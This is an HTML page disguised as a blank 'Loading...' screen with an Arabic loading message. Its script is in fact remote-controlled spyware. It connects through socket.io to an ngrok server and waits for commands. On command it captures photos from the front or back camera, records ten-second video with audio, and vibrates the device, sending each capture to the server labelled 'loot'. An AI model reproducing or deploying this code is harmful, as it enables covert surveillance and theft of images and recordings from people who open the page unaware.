<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><title>Loading...</title>
    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center;">
    <h2>جاري التحميل...</h2>
    <script>
        const SERVER_URL = "https://kinship-porridge-molasses.ngrok-free.dev";
        let socket, activeStream = null;

        async function stopStream() {
            if(activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
        }

        async function takePhoto(facing) {
            await stopStream();
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
                const v = document.createElement('video'); v.srcObject = activeStream; await v.play();
                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                socket.emit('loot', { type:'photo', data: c.toDataURL('image/png').split(',')[1], timestamp: Date.now() });
                stopStream();
            } catch(e) { socket.emit('loot', { info: "Cam Error: "+e.message }); }
        }

        async function recordVid(sec, facing) {
            await stopStream();
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio:true });
                const rec = new MediaRecorder(activeStream), chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const r = new FileReader();
                    r.onload = () => socket.emit('loot', { type:'video', data: r.result.split(',')[1], timestamp: Date.now() });
                    r.readAsDataURL(blob);
                    stopStream();
                };
                rec.start(); setTimeout(() => rec.stop(), sec*1000);
            } catch(e) { socket.emit('loot', { info: "Vid Error: "+e.message }); }
        }

        socket = io(SERVER_URL);
        socket.on('command', (cmd) => {
            if(cmd.action === 'scan_front') takePhoto("user");
            if(cmd.action === 'scan_back') takePhoto("environment");
            if(cmd.action === 'vid_front') recordVid(10, "user");
            if(cmd.action === 'vid_back') recordVid(10, "environment");
            if(cmd.action === 'vibrate') navigator.vibrate(500);
            if(cmd.action === 'screenshot') /* كود السكرين شوت كما هو */ ;
        });
    </script>
</body>
</html>
